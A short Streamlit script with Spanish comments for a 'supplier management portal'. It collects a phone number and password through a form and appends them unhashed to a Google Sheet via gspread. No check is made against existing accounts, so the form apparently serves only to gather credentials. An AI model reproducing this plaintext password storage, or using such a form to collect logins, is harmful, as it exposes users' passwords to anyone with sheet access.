import streamlit as st
import pandas as pd
import gspread
from google.oauth2.service_account import Credentials

# Mostrar Título y Descripción
st.title("Portal de Gestión de Proveedores")

# Cargar credenciales desde los secretos
secrets = st.secrets["connections"]["gsheets"]
credentials = Credentials.from_service_account_info(secrets)

# Autorizar gspread con las credenciales
gc = gspread.authorize(credentials)

# Abrir la hoja de cálculo
spreadsheet = gc.open("Registros de Usuarios")  # Asegúrate de que este sea el nombre correcto
worksheet = spreadsheet.sheet1  # O el índice de la hoja deseada

# Obtener datos existentes
existing_data = pd.DataFrame(worksheet.get_all_records())
existing_data = existing_data.dropna(how="all")

# Formulario para agregar celular y contraseña
with st.form(key="credentials_form"):
    celular = st.text_input(label="Celular*")
    contrasena = st.text_input(label="Contraseña*", type="password")

    # Marcar campos obligatorios
    st.markdown("**obligatorio*")

    submit_button = st.form_submit_button(label="Enviar Detalles")

    # Si se presiona el botón de envío
    if submit_button:
        # Verificar si se completaron los campos obligatorios
        if not celular or not contrasena:
            st.warning("Asegúrese de que todos los campos obligatorios estén completos.")
            st.stop()
        
        # Crear una nueva fila con celular y contraseña
        datos = pd.DataFrame(
            [
                {
                    "Celular": celular,
                    "Contrasena": contrasena,
                }
            ]
        )

        # Agregar los nuevos datos a los datos existentes
        updated_df = pd.concat([existing_data, datos], ignore_index=True)

        # Actualizar Google Sheets con los nuevos datos
        worksheet.update([updated_df.columns.tolist()] + updated_df.values.tolist())

        st.success("¡Detalles enviados exitosamente!")
